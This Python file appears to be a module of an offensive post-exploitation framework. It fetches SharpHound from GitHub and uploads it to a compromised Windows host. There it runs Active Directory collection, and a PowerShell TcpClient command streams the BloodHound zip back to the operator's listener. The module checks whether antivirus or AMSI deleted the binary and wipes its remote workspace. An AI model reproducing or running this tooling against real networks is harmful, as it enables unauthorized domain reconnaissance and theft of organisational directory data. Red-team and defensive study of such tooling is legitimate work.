from __future__ import annotations

import json
import os
import re
import tempfile
import time
import urllib.request
import uuid
import zipfile

from koi.modules.blueprint import KoiModule, TCPReceiveServer
from koi.utils.config import TIMEOUTS


_RELEASE_API = "https://api.github.com/repos/SpecterOps/SharpHound/releases/latest"
_ASSET_RE   = re.compile(r"^SharpHound_v[\d\.]+_windows_x86\.zip$", re.I)


class SharpHoundModule(KoiModule):
    name        = "sharphound"
    description = "Fetch SharpHound, run it on target and retrieve the BloodHound zip locally."
    usage       = "sharphound <id> [-c <collection>] [-o <local_zip>]"
    category    = "Active Directory"
    platform    = "windows_ps"
    arguments   = [
        {"flags": ["-c", "--collection"], "default": "Default",
         "help":  "Collection methods passed to -c (default: Default)"},
        {"flags": ["-o", "--output"], "default": None,
         "help":  "Local path for the BloodHound zip"},
    ]

    def _fetch_release(self) -> dict:
        req = urllib.request.Request(
            _RELEASE_API,
            headers={"User-Agent": "koi-sharphound"},
        )
        with urllib.request.urlopen(req, timeout=TIMEOUTS["http_fetch"]) as resp:
            return json.load(resp)

    def _find_asset(self, release: dict) -> tuple[str, str] | None:
        for asset in release.get("assets", []):
            name = asset.get("name", "")
            if _ASSET_RE.match(name):
                return name, asset["browser_download_url"]
        return None

    def _download_zip(self, url: str) -> bytes:
        req = urllib.request.Request(url, headers={"User-Agent": "koi-sharphound"})
        with urllib.request.urlopen(req, timeout=TIMEOUTS["http_fetch"]) as resp:
            return resp.read()

    def _extract_payload(self, zip_bytes: bytes) -> dict[str, bytes]:
        """Extract every file in the zip; return {basename: bytes}."""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp.write(zip_bytes)
            tmp_path = tmp.name
        try:
            files: dict[str, bytes] = {}
            with zipfile.ZipFile(tmp_path) as zf:
                for member in zf.namelist():
                    if member.endswith("/"):
                        continue
                    base = os.path.basename(member)
                    if not base:
                        continue
                    files[base] = zf.read(member)
            if not any(n.lower() == "sharphound.exe" for n in files):
                raise FileNotFoundError("SharpHound.exe not found in archive")
            return files
        finally:
            os.unlink(tmp_path)

    def _run_and_collect(
        self, work_dir: str, exe_name: str,
        log_name: str, collection: str, timeout: float,
    ) -> tuple[str, bytes]:
        """Run SharpHound on target, return (status, payload)."""
        local_ip = self._get_local_ip()
        srv  = TCPReceiveServer(timeout=timeout).start()
        port = srv.port

        ps_cmd = (
            f"$ErrorActionPreference='Continue';"
            f"$work=(Get-Item '{work_dir}').FullName;"
            f"$exe=Join-Path $work '{exe_name}';"
            f"$log=Join-Path $work '{log_name}';"
            f"$payload=$null;"
            f"try{{"
            f"  Push-Location $work;"
            f"  & $exe -c {collection} --outputdirectory $work *>&1 | Out-File -FilePath $log -Encoding utf8;"
            f"  Pop-Location;"
            f"  $zip=Get-ChildItem -Path $work -Filter '*_BloodHound.zip' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName;"
            f"  if($zip -and (Test-Path $zip)){{"
            f"    $b=[IO.File]::ReadAllBytes($zip);"
            f"    $h=[Text.Encoding]::UTF8.GetBytes('OK:');"
            f"    $payload=New-Object byte[] ($h.Length+$b.Length);"
            f"    [Array]::Copy($h,0,$payload,0,$h.Length);"
            f"    [Array]::Copy($b,0,$payload,$h.Length,$b.Length);"
            f"  }}else{{"
            f"    $logTxt=if(Test-Path $log){{[IO.File]::ReadAllText($log)}}else{{'(no log file produced)'}};"
            f"    $payload=[Text.Encoding]::UTF8.GetBytes('ERR:'+$logTxt);"
            f"  }}"
            f"}}catch{{"
            f"  $payload=[Text.Encoding]::UTF8.GetBytes('EXC:'+$_.ToString());"
            f"}}"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_s.Write($payload,0,$payload.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self._dispatch_ps(ps_cmd)
        data = srv.collect()
        if data.startswith(b"OK:"):
            return "ok", data[3:]
        if data.startswith(b"ERR:"):
            return "err", data[4:]
        if data.startswith(b"EXC:"):
            return "exc", data[4:]
        return "raw", data

    def run(self) -> None:
        collection = self.args.collection
        local_path = self.args.output or f"bloodhound_{time.strftime('%Y%m%d_%H%M%S')}.zip"

        with self.spinner("Fetching latest SharpHound release info..."):
            try:
                release = self._fetch_release()
            except Exception as exc:
                self.err(f"GitHub API request failed: {exc}")
                return

        version = release.get("tag_name", "?")
        match = self._find_asset(release)
        if match is None:
            self.err(f"No asset matching SharpHound_*_windows_x86.zip in release {version}")
            return

        asset_name, asset_url = match
        self.ok(f"Found {asset_name} ({version})")

        with self.spinner(f"Downloading {asset_name}..."):
            try:
                zip_bytes = self._download_zip(asset_url)
                files     = self._extract_payload(zip_bytes)
            except Exception as exc:
                self.err(f"Download or extraction failed: {exc}")
                return

        token  = uuid.uuid4().hex[:8]
        work   = f".\\sh_{token}"
        log_nm = "sharphound.log"
        exe_nm = next(n for n in files if n.lower() == "sharphound.exe")

        with self.spinner("Preparing remote workspace..."):
            self._win_query(
                f"New-Item -ItemType Directory -Path '{work}' -Force | Out-Null"
            )

        self.status(f"Uploading {len(files)} file(s) to target...")
        for name, blob in files.items():
            dest = f"{work}\\{name}"
            bar = self.ui.ProgressBar(total=len(blob), prefix=name)
            ok = self._upload_bytes(blob, dest, timeout=TIMEOUTS["upload"], on_progress=bar.update)
            bar.done()
            print()
            if not ok:
                self.err(f"Upload of {name} failed.")
                self._cleanup(work)
                return

        time.sleep(0.5)

        check = self._win_query(f"(Test-Path '{work}\\{exe_nm}').ToString()")
        if check.strip().lower() != "true":
            self.err(
                f"SharpHound.exe not present after upload, likely AV/AMSI removed it. "
                f"Workspace kept at {work} for inspection."
            )
            return

        self.status(
            f"Running SharpHound on target, collection: {collection}. "
            f"This can take several minutes."
        )
        try:
            with self.spinner("Collecting and waiting for the zip..."):
                status, payload = self._run_and_collect(
                    work, exe_nm, log_nm, collection, timeout=1800.0
                )
        except Exception as exc:
            self.err(
                f"SharpHound run failed: {exc}. "
                f"Workspace kept at {work} for inspection."
            )
            return

        if status != "ok":
            text = payload.decode("utf-8", errors="replace")
            label = {"err": "SharpHound did not produce a zip", "exc": "PowerShell exception", "raw": "Unexpected response"}[status]
            self.err(f"{label}. Workspace kept at {work} for inspection.")
            print()
            self.breaker(label)
            print(text)
            self.breaker()
            return

        try:
            with open(local_path, "wb") as f:
                f.write(payload)
        except OSError as exc:
            self.err(f"Could not write {local_path}: {exc}")
            self._cleanup(work)
            return

        self._cleanup(work)

        self.box("SharpHound complete", {
            "version":   version,
            "asset":     asset_name,
            "local zip": os.path.abspath(local_path),
            "size":      f"{len(payload)} bytes ({len(payload)/1024:.1f} KB)",
        })

    def _cleanup(self, work_dir: str) -> None:
        try:
            self._win_query(
                f"Remove-Item -Recurse -Force '{work_dir}' -ErrorAction SilentlyContinue"
            )
        except Exception:
            pass
